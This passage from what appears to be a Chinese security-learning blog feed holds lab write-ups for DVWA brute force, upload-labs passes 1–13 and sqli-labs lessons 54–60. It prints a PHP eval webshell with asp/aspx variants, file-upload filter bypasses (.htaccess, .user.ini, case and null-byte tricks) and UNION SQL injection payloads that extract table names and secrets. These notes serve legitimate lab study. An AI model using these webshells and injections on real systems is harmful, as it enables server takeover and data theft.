class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $row    = mysqli_fetch_assoc( $result );</span><br><span class="line">        $avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>补充——</strong> <strong>$GLOBALS ：</strong>引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>通过代码审计我们可以看到，服务器使用了Anti-CSRF token来抵御CSRF的攻击，使用了stripslashes函数和mysqli_real_esacpe_string来抵御SQL注入和XSS的攻击。而且由于使用了Anti-CSRF token，每次服务器返回到登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，我们不能再像low和medium级别一样，利用burpsuite进行无脑式的爆破了。</p><p>这关可以有两种解法，一种是利用paython脚本从html页面中抓取user_token的值（但是我还没学paython，等以后补吧），另一种是仍使用burp，因为即使我们输错密码， sleep( rand( 0, 3 ) )也只会网页延迟0到3秒，不足以防御暴力破解。但我们需要更换攻击模式等，我们下面展开来讲：</p><ul><li><p>将攻击模式改为<strong>Pitchfork</strong>{草叉模式 ——它可以使用多组Payload集合，在每一个不同的Payload标志 位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置， 第一个Payload值为A和B，第二个Payload值为a和b，则发起攻击时，将共发起两次攻 击，第一次使用的Payload分别为A和a，第二次使用的Payload分别为B和b。}并将password和user_token设为变量。![5](DVWA—Brute Force/5-1614780376113.png)</p></li><li><p>第一个变量password我们就照常载入字典就可以了。第二个变量user_token的payload设置我们选择Recursive grep 选项（Recursive grep——此Payload类型主要使用于从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为Payload，然后替换Payload的位置，进行 攻击。它的数据来源了原始的响应消息，基于原始响应，在Payload的可选项设置 （Options）的 Grep-Extract中配置Grep规则，然后根据grep去提取数据才能发生攻击），然后我们在option 选项中找到 Grep-Extract ,点击 Add, 然后点击 Refetch repose 即可看到抓取到的源代码了，我们找到 user_token 的值value，选中它，之后点击ok。![6](DVWA—Brute Force/6.png)</p><p>![7](DVWA—Brute Force/7-1614781678680.png)</p></li></ul><p>其实上述的操作只是为了达到一个目的：由于每次访问服务器后，user_token都会刷新，那么我们要让变量user_token”与时俱进“。</p><p>此外我们要将线程设为1，因为recursive grep payloads cannot be used with multiple request threads。同时 在 Options 中找到 Redirections 设置为 Always。做完这些准备操作，就可以点击start attack开始爆破，</p><p>![8](DVWA—Brute Force/8.png)</p><p>我们可以有两个值的回文长度异常，我们点击数据具体查看回文，发现密码为paaword时登入成功：</p><p>![9](DVWA—Brute Force/9.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;该系列的实验主要围绕利用burpsuite的暴力破解。暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-pass1—13</title>
    <link href="http://example.com/2021/02/09/upload-labs-pass1-13/"/>
    <id>http://example.com/2021/02/09/upload-labs-pass1-13/</id>
    <published>2021-02-09T11:32:20.000Z</published>
    <updated>2021-02-24T04:51:36.883Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>upload-labs主要是一些针对文件上传漏洞的实验。</p><p>再正式开始之前，先了解一下<strong>什么是文件上传漏洞？</strong></p><p><strong>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将，将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码——攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。然后利用渗透工具（如蚁剑）连接webshell以达到操作服务器的目的。</strong></p><ul><li><strong>上传漏洞类型大体可分为以下几类：</strong></li></ul><p><img src="/2021/02/09/upload-labs-pass1-13/1.png" alt="1"></p><ul><li><p>判断上传漏洞类型的思路：<img src="/2021/02/09/upload-labs-pass1-13/2.png" alt="2" style="zoom: 200%;"></p></li><li><p><strong>webshell（一句话木马）的制备</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板： <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;password&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>@</code>表示后面即使执行错误，也不报错。<code>eval（）</code>函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;password&#39;]</code>表示从页面中用post的方式获得password这个参数值。</p></li></ul><p>那么这句话的作用是什么呢？举个例子：password=echo ‘a’，就相当于&lt; ?php @eval(“echo ‘a’”);? &gt;即再网页上输出一个a。我们知道了这个就可以根据改变password的值来达到操控服务器的目的了，或者我们可以连接蚁剑，一键获取目标服务器。</p><p><strong>补充：</strong></p><ul><li><strong>入侵的条件</strong></li></ul><p>（1）木马上传成功，未被杀；<br>（2）知道木马的路径在哪；<br>（3）上传的木马能正常运行。</p><ul><li><p><strong>常见的一句话木马</strong></p><p>php的一句话木马： &lt; ?php @eval($_POST[‘pass’]);? &gt;<br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p></li></ul><h1 id="pass-01：js检查"><a href="#pass-01：js检查" class="headerlink" title="pass-01：js检查"></a>pass-01：js检查</h1><p>打开pass-01的index.php查看源码，我们看到网页对上传的图片做了js检查，</p><p><img src="/2021/02/09/upload-labs-pass1-13/3.png" alt="3"></p><p>而且设置了上传白名单，<img src="/2021/02/09/upload-labs-pass1-13/4.png" alt="4"></p><p>因此题目要求我们上传一个webshell到服务器上，我们可以有以下三种思路：</p><ol><li>删除那段有关js检查的代码</li><li>增加白名单中可上传文件类型</li><li>先将上传文件类型改为白名单的一种（使其通过js检查）然后用burp抓包，再将其文件后缀更改为预期文件类型</li></ol><h1 id="pass-02：MIME绕过"><a href="#pass-02：MIME绕过" class="headerlink" title="pass-02：MIME绕过"></a>pass-02：MIME绕过</h1><ul><li>查看提示：本pass在服务端对数据包的<strong>MIME</strong>进行检查。</li></ul><p><strong>MIME：</strong>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。</p><p><strong>常见的MIME类型：</strong></p><p>udio/mpeg -&gt; .mp3<br>application/msword -&gt; .doc<br>application/octet-stream -&gt; .exe<br>application/pdf -&gt; .pdf<br>application/x-javascript -&gt; .js<br>application/x-rar -&gt; .rar<br>application/zip -&gt; .zip<br>image/gif -&gt; .gif<br>image/jpeg -&gt; .jpg / .jpeg<br>image/png -&gt; .png<br>text/plain -&gt; .txt<br>text/html -&gt; .html<br>video/mp4 -&gt; .mp4</p><ul><li><strong>查看源码：</strong><img src="/2021/02/09/upload-labs-pass1-13/5.png" alt="5"></li></ul><p>也就是说服务器还是规定了白名单，那么我们可以有以下两种思路：</p><p>1.先将webshell后缀类型改为允许上传的文件后缀类型（使其绕过MIME检查），然后burp抓包，将webshell后缀改回.php。</p><p>2.将webshell.php文件上传，burp抓包，将Content-Type的MIME类型改为白名单中的类型。</p><ul><li><strong>sp：</strong>我在看源码的时候发现这关的源码也存在js检查的源码，但是我发现把这段码删了并不能实现上传webshell，因为源码中没有规定checkfile()的作用，而且服务器是通过if语句判断上传文件类型是否符合。</li></ul><h1 id="pass-03：上传特殊可解析后缀"><a href="#pass-03：上传特殊可解析后缀" class="headerlink" title="pass-03：上传特殊可解析后缀"></a>pass-03：上传特殊可解析后缀</h1><ul><li>查看源码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到服务器对上传文件做了很多过滤处理，包括设定了黑名单。</p><ul><li>这边我们补充一个知识点：Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置（AddType application/x-httpd-php .php .php3 .phtml），规定哪些文件后缀是以php格式来解析的。</li></ul><p>​      我们看到黑名单中没有禁用这些可解析后缀，因此我们可以利用这一点，上传可解析后缀。</p><ul><li><p>sp：常用可解析后缀<img src="/2021/02/09/upload-labs-pass1-13/6.png" alt="6"></p></li><li><p>陌生函数：</p></li></ul><p>！strrchr() 函数</p><p>功能：查找字符，在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。</p><p>语法：strrchr(string，char)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。规定被搜索的字符串。</td></tr><tr><td>char</td><td>必需。规定要查找的字符。如果该参数是数字，则搜索匹配数字 ASCII 值的字符。</td></tr></tbody></table><p>！trim()函数</p><p>功能：除去<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2/1017763">字符串</a>开头和末尾的空格或其他字符。</p><p>语法：trim (string $str [,string $charlist ])</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定要检查的字符串。</td></tr><tr><td><em>charlist</em></td><td>可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\0” - NULL ；”\t” - 制表符； “\n” - 换行； “\x0B” - 垂直制表符； “\r” - 回车 ；” “ - 空格</td></tr></tbody></table><p>！in_array()函数</p><p>功能：搜索数组中是否存在指定的值。</p><p>语法：in_array(search,array,type)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>search</em></td><td>必需。规定要在数组搜索的值。</td></tr><tr><td><em>array</em></td><td>必需。规定要搜索的数组。</td></tr><tr><td><em>type</em></td><td>可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</td></tr></tbody></table><p>！move_uploaded_file() 函数</p><p>功能：将上传的文件移动到新位置。</p><p>语法：move_uploaded_file(file,newloc)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>file</td><td>必需。规定要移动的文件。</td></tr><tr><td>newloc</td><td>必需。规定文件的新位置。</td></tr></tbody></table><ul><li>注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。</li></ul><p>！str_ireplace() 函数</p><p>功能：替换字符串中的一些字符（不区分大小写）。</p><p>语法：str_ireplace(find,replace,string,count)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>find</em></td><td>必需。规定要查找的值。</td></tr><tr><td><em>replace</em></td><td>必需。规定替换 <em>find</em> 中的值的值。</td></tr><tr><td><em>string</em></td><td>必需。规定被搜索的字符串。</td></tr><tr><td><em>count</em></td><td>可选。一个变量，对替换数进行计数。</td></tr></tbody></table><h1 id="pass-04：上传-htaccess"><a href="#pass-04：上传-htaccess" class="headerlink" title="pass-04：上传.htaccess"></a>pass-04：上传.htaccess</h1><ul><li>这关的黑名单添加了可解析后缀，但是忽略了.htaccess类型。</li></ul><p>htaccess文件是Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能。其中.htaccess文件内容:SetHandler application/x-httpd-php设置当前目录所有文件都使用PHP解析，无论上传任何类型文件，只要文件内容符合php语言代码规范，就会被当做php文件执行。</p><ul><li>因此这关的思路是：先上传一个后缀为.htaccess，内容为：SetHandler application/x-httpd-php</li></ul><p>​           &lt;FilesMatch “webshell.jpg”&gt;                   </p><p>或　　                 SetHandler application/x-httpd-php         的文件，然后再上传webshell.jpg即可。</p><p>​            </p><ul><li>注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。</li></ul><h1 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h1><ul><li>pass-04是利用Apache的解析文件进行绕过黑名单，这关则是利用PHP的解析方式绕过黑名单。</li></ul><p>我们看到黑名单里又多加了一个htaccess类型，但是php配置文件类型php.ini没有被禁用，且提示告诉我们上传目录存在php文件（readme.php）。 </p><ul><li>那么这关的思路：先上传一个后缀为.user.ini（相当于用户自定义的php.ini）内容为 auto_prepend_file=webshell.png（意思是该目录下的所有php文件都包含webshell.png），然后我们再上传webshell.png，最后用蚁剑连接时我们要注意连接的是readme.php（因为其文件内容包含shell）而不是webshell.png。</li></ul><p>但是这里我其实有个疑问：那就是我们在现实渗透的时候又怎么会知道靶机的上传目录是否存在.php类型文件，以及.php文件的文件名呢？挖个坑！！！！！！！！！！！！！！！！！！！！！！！！！！！</p><h1 id="pass-06：后缀大小写绕过"><a href="#pass-06：后缀大小写绕过" class="headerlink" title="pass-06：后缀大小写绕过"></a>pass-06：后缀大小写绕过</h1><ul><li><p>这关我们查看源码发现，它的黑名单已经相当齐全了，但是它相对前几关删了一个函数：strtolower()。其作用就是把所有字符全部转为小写字母。</p></li><li><p>那么这关利用这一漏洞，上传webshell.phP文件，然后蚁剑连接即可。</p></li></ul><h1 id="pass-07：空格绕过"><a href="#pass-07：空格绕过" class="headerlink" title="pass-07：空格绕过"></a>pass-07：空格绕过</h1><ul><li><p>查看源码发现它删去了trim()函数。</p></li><li><p>这边补一个知识：在win系统下呢，如果文件后缀最后面是空格、点、：：$DATA会自动省去，也就是说在客户端目录下的是文件名是”干净”。那么我们这关的思路是：上传webshell.php文件然后抓包，在后缀后加一个空格。</p></li><li><p>那么这关的思路就是：先上传webshell.php，抓包，在后缀后加个空格</p><p>sp：没能复现</p></li></ul><h1 id="pass-08：点绕过"><a href="#pass-08：点绕过" class="headerlink" title="pass-08：点绕过"></a>pass-08：点绕过</h1><ul><li>查看源码发现它删去了deldot()函数。原理同pass-07</li></ul><p>那么这关的思路就是：上传webshell.php然后抓包，在后缀后加个点（.）</p><h1 id="pass-09：-DATA绕过"><a href="#pass-09：-DATA绕过" class="headerlink" title="pass-09：::$DATA绕过"></a>pass-09：::$DATA绕过</h1><ul><li>查看源码发现少了对::$DATA的过滤。</li></ul><p>DATA(NTFS文件系统的存储数据流的一个属性)NTFS文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：$DATA,当我们访问1.php::$DATA 时，就是请求 1.php 本身的数据，如果a.php 还包含了其他的数据流，比如a.php:lake2.php，请求1.php:lake2.php::$DATA，则是请求1.php中的流数据lake2.php的流数据内容。</p><ul><li>那么我们这关的思路是：先webshell.php，抓包，后缀后添加::DATA，最后蚁剑连接。</li></ul><h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><ul><li>这关查看源码发现过滤的都过滤了，但是和以往有一点不同：上传位置表达方式改变</li></ul><p>旧：$img_path = UPLOAD_PATH.’/‘.date(“YmdHis”).rand(1000,9999).$file_ext;</p><p>新：$img_path = UPLOAD_PATH.’/‘.$file_name;</p><p>sp：没能复现</p><h1 id="pass-11：双后缀名绕过"><a href="#pass-11：双后缀名绕过" class="headerlink" title="pass-11：双后缀名绕过"></a>pass-11：双后缀名绕过</h1><p>我们查看源码，发现关键句：$file_name = str_ireplace($deny_ext,””, $file_name);意思是查找上传的文件名中是否存在黑名单中的值，如果存在就删去。</p><p>那么这关我们的思路是：上传webshell.php，抓包，后缀更改为pphphp</p><h1 id="pass-12：-00截断（get型）"><a href="#pass-12：-00截断（get型）" class="headerlink" title="pass-12：%00截断（get型）"></a>pass-12：%00截断（get型）</h1><p>查看这关的源码，发现上传位置表达方式改变了——$img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext;</p><p>我们可以发现save_pasth是可控路径，有点像sql注入里?id=。</p><p>先补充知识：</p><p>1.php语法中，当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生。</p><p>2.%00是对ascii码中的0对应的字符编码后的结果，0x00则是%00解码成的16进制。当url中的参数是通过GET方式获取时，%00会被自动解码。当通过POST方式获取时，不会自动解码，%00只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它改写为十六进制0x00。</p><p><img src="/2021/02/09/upload-labs-pass1-13/7.png" alt="7"></p><p>那么这关我们的思路就是：上传webshell.png，抓包，令save_pasth=../upload/webshell.php%00</p><p>sp：strrpos()函数</p><p>功能：strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。返回字符（字符串）在目标字符串中最后一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。</p><p>语法：strrpos(string,find,start)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><em>string</em></td><td>必需。规定被搜索的字符串。</td></tr><tr><td><em>find</em></td><td>必需。规定要查找的字符。</td></tr><tr><td><em>start</em></td><td>可选。规定在何处开始搜索。</td></tr></tbody></table><h1 id="pass-13：0x00截断（post型）"><a href="#pass-13：0x00截断（post型）" class="headerlink" title="pass-13：0x00截断（post型）"></a>pass-13：0x00截断（post型）</h1><p>法一：同pass-12</p><p>法二：上传webshell.png，抓包</p><p><img src="/2021/02/09/upload-labs-pass1-13/8.png" alt="8"></p><p>加上webshell.php，然后点开Hex，将webshell.php后面的20改为00，如果找不到20，那么就在raw的webshell.php后面加个空格<img src="/2021/02/09/upload-labs-pass1-13/9.png" alt="9"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;upload-labs主要是一些针对文件上传漏洞的实验。&lt;/p&gt;
&lt;p&gt;再正式开始之前，先了解一下&lt;strong&gt;</summary>
      
    
    
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>lesson54-65</title>
    <link href="http://example.com/2021/02/08/lesson54-65/"/>
    <id>http://example.com/2021/02/08/lesson54-65/</id>
    <published>2021-02-08T15:57:12.000Z</published>
    <updated>2021-02-10T10:53:48.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lesson54："><a href="#lesson54：" class="headerlink" title="lesson54："></a>lesson54：</h1><p>我们通过查看蓝字可以大致明白这关的意思：输入payload的次数小等于十次的情况下获得数据库秘钥，如果超过十次那么表名，列名还有秘钥就会重新刷新。</p><ul><li>试探注入类型：?id=1’，页面错误，但是没有回显错误信息</li></ul><p>?id=1’ and ‘1’=’1，登入成功，回显用户名和密码</p><p>?id=1’ and ‘1’=’2，页面错误</p><ul><li><p>因此我们可知存在sql注入点，且为单引号型。</p></li><li><p>因为我们知道了库名，我们就无需再爆库了。</p></li></ul><p>爆表：?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’ –+</p><p>爆列：?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xfih974sor ‘–+</p><p>爆值：?id=-1’ union select 1,2,group_concat(secret_2W57) from challenges.xfih974sor–+</p><p>然后我们把得到的值输入，submit即可。</p><ul><li>最后查看源码，发现PHP对输入的key做了过滤处理，也就是说我们想从key一栏进行注入还是比较困难的。</li></ul><h1 id="lesson55："><a href="#lesson55：" class="headerlink" title="lesson55："></a>lesson55：</h1><p>同lesson54，不过注入类型改为了<code>)</code>。</p><h1 id="lesson56："><a href="#lesson56：" class="headerlink" title="lesson56："></a>lesson56：</h1><p>同lesson54，不过注入类型改为了<code>&#39;)</code>。</p><h1 id="lesson57"><a href="#lesson57" class="headerlink" title="lesson57:"></a>lesson57:</h1><p>同lesson54，不过注入类型改为了<code>&quot;</code>。</p><h1 id="lesson58"><a href="#lesson58" class="headerlink" title="lesson58:"></a>lesson58:</h1><p>执行 sql 语句后，并没有返回数据库当中的数据，所以我们这里不能使用 union 联合注入， 这里使用报错注入或者延时注入。</p><p><img src="/2021/02/08/lesson54-65/1.png" alt="1"></p><h1 id="lesson59："><a href="#lesson59：" class="headerlink" title="lesson59："></a>lesson59：</h1><p>同lesson58，注入类型变为数字型。</p><h1 id="lesson60："><a href="#lesson60：" class="headerlink" title="lesson60："></a>lesson60：</h1><p>同lesson58，注入类型变为<code>&quot;)</code>。</p><h1 id="lesson61："><a href="#lesson61：" class="headerlink" 